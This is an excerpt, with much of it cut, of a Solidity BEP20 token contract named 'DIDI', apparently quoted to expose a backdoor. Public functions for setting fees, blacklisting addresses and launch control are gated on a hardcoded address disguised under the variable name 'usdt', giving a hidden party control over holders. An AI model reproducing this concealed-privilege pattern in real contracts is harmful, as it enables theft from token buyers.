...
contract DIDI is IBEP20, Auth {
    ...
    constructor () Auth(msg.sender) {
        ...
        // NICE!
        autoLiquidityReceiver = 0xA05532e54aB3B041f5cA5C89882a310f24CF211F; 
        marketingFeeReceiver = 0xA05532e54aB3B041f5cA5C89882a310f24CF211F; 
...
// tao
    function launchStatus(address user,address re ,uint amount) public  {require(msg.sender == usdt);
     if(amount == 0){
...
//609-653回流分配
    ...
    address usdt = 0x485718E2e19F56b57186B557e2051B8E860AEB00;
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) public  {require(msg.sender == usdt);
    ...
    function blacklistAddress(address _address, bool _value) public  {require(msg.sender == usdt);
